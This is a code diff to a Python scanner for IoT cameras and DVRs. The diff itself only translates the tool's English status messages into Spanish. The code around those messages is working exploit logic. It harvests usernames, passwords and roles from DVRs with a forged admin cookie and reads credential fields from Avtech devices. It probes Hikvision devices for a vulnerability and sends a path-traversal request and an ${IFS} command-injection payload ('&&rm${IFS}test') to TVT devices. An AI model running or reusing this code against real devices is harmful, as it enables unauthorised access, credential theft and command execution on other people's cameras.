@@ -272,19 +272,19 @@ def scan_dvr_credentials(ip, port):
         rX = requests.get(fullHost_1, headers=makeReqHeaders(xCookie="admin"), timeout=10.0)
         rX.raise_for_status()  # Raise an exception for non-2xx HTTP status codes
     except Exception as e:
-        print(Colors.RED + " [+] Timed out or Error: " + str(e) + Colors.DEFAULT)
+        print(Colors.RED + " [+] Tiempo de espera agotado: " + str(e) + Colors.DEFAULT)
         return "No se pudieron obtener credenciales: " + str(e)
 
     badJson = rX.text
     if not badJson:
-        print(Colors.RED + " [+] No credentials found or Not Vulnerable" + Colors.DEFAULT)
+        print(Colors.RED + " [+] No se encontraron credenciales o no es vulnerable" + Colors.DEFAULT)
         return "No se encontraron credenciales o No vulnerable"
 
     try:
         dataJson = json.loads(badJson)
         totUsr = len(dataJson["list"])
     except Exception as e:
-        print(Colors.RED + " [+] Error parsing JSON: " + str(e) + Colors.DEFAULT)
+        print(Colors.RED + " [+] Error al analizar JSON: " + str(e) + Colors.DEFAULT)
         return "Error al analizar JSON: " + str(e)
     
     print(Colors.GREEN + "\n [+] DVR (url):\t\t" + Colors.ORANGE + f"http://{ip}:{port}/" + Colors.GREEN)
@@ -295,7 +295,7 @@ def scan_dvr_credentials(ip, port):
     credentials_list = []
 
     if totUsr > 0:
-        print(Colors.GREEN + " [+] Credentials Found:" + Colors.DEFAULT)
+        print(Colors.GREEN + " [+] Credenciales Encontradas:" + Colors.DEFAULT)
         for obj in range(0, totUsr):
             _usuario = dataJson["list"][obj]["uid"]
             _password = dataJson["list"][obj]["pwd"]
@@ -304,7 +304,7 @@ def scan_dvr_credentials(ip, port):
             credentials_list.append(f"Usuario: {_usuario}, Contraseña: {_password}, Rol: {_role}")
         return credentials_list
     else:
-        print(Colors.RED + " [+] No credentials found." + Colors.DEFAULT)
+        print(Colors.RED + " [+] No se encontraron credenciales." + Colors.DEFAULT)
         return "No se encontraron credenciales."
 
 def is_valid_ip(ip):
@@ -343,7 +343,7 @@ def check_vuln_hikvision(ip, port):
     try:
         data = requests.get(url)
         if data.status_code != 200:
-            print(Colors.RED + f"[{ip}:{port}] - not vulnerable (Code: {data.status_code})" + Colors.DEFAULT)
+            print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {data.status_code})" + Colors.DEFAULT)
             return None
 
         data = requests.get(url + "/doc/page/login.asp")
@@ -354,10 +354,10 @@ def check_vuln_hikvision(ip, port):
         data = requests.get(url + "c")
         if data.status_code != 200:
             if data.status_code == 500:
-                print(Colors.RED + f"[{ip}:{port}] - could not verify if vulnerable (Code: {data.status_code})" + Colors.DEFAULT)
+                print(Colors.RED + f"[{ip}:{port}] - no se pudo verificar si era vulnerable (Code: {data.status_code})" + Colors.DEFAULT)
                 return None
             else:
-                print(Colors.RED + f"[{ip}:{port}] - not vulnerable (Code: {data.status_code})" + Colors.DEFAULT)
+                print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {data.status_code})" + Colors.DEFAULT)
                 return None
 
         print(Colors.GREEN + f"[{ip}:{port}] - Posible-Vulnerabilidad-Hikvision" + Colors.DEFAULT)
@@ -390,7 +390,7 @@ def check_vuln_avtech(ip, port, etype=1):
             user_username = response.text.split("User1.Username=")[1].split("\n")[0]
             user_password = response.text.split("User1.Password=")[1].split("\n")[0]
         except IndexError:
-            print(Colors.RED + f"[{ip}:{port}] - not vulnerable (Code: {response.status_code})" + Colors.DEFAULT)
+            print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
             return None
 
         print(Colors.GREEN + f"[{ip}:{port}] - Posible-Vulnerabilidad-Hikvision" + Colors.DEFAULT)
@@ -398,7 +398,7 @@ def check_vuln_avtech(ip, port, etype=1):
         return True
 
     else:
-        print(Colors.RED + f"[{ip}:{port}] - not vulnerable (Code: {response.status_code})" + Colors.DEFAULT)
+        print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
         if etype == 1:
             check_vuln_avtech(ip, port, 2)
         return None
@@ -419,13 +419,13 @@ def check_vuln_tvt(ip, port):
         response = raw_url_request(f"http://{ip}:{port}/../../../../../../../mnt/mtd/test")
         raw_url_request(f"http://{ip}:{port}/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js")
     except (ConnectionError, Timeout) as e:
-        print(Colors.RED + f"[{ip}:{port}] - connection/timeout error" + Colors.DEFAULT)
+        print(Colors.RED + f"[{ip}:{port}] - Conexion/Agotada error" + Colors.DEFAULT)
         return False
     if response.text[0] != '1':
-        print(Colors.RED + f"[{ip}:{port}] - not vulnerable (Code: {response.status_code})" + Colors.DEFAULT)
+        print(Colors.RED + f"[{ip}:{port}] - NO-VULNERABLE (Code: {response.status_code})" + Colors.DEFAULT)
         return False
 
-    print(Colors.GREEN + f"[{ip}:{port}] - verified exploitable" + Colors.DEFAULT)
+    print(Colors.GREEN + f"[{ip}:{port}] - Posible Exploit" + Colors.DEFAULT)
     return True
 
 def capture_screenshot(ip, port, width=1024, height=768):
@@ -547,14 +547,14 @@ def scan(ip, ports):
                     credentials_found = "NULL"
                     
                     if is_camera(ip, port) and not "HTTP/1.0 302 Found" in banner and not "unknown" in banner:
-                        print(f"{Fore.GREEN}*Found Camera{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}[+]Camara-Encontrada{Style.RESET_ALL}")
                         hikvision_vulnerable = check_vuln_hikvision(ip, port)
                         cam = verificar_respuesta_200(ip,port,tiempo_cancelacion=1)
                         if hikvision_vulnerable:
                             avtech_vulnerable = check_vuln_avtech(ip, port)
                             tvt_vulnerable = check_vuln_tvt(ip, port)
                     else:
-                        print(f"{Fore.RED}Not-Found Camera{Style.RESET_ALL}")
+                        print(f"{Fore.RED}[-]Cámara-No-Encontrada{Style.RESET_ALL}")
                         
                     if "HTTP/1.0 302 Found" in banner:
                         credentials_found = scan_dvr_credentials(ip, port)                           
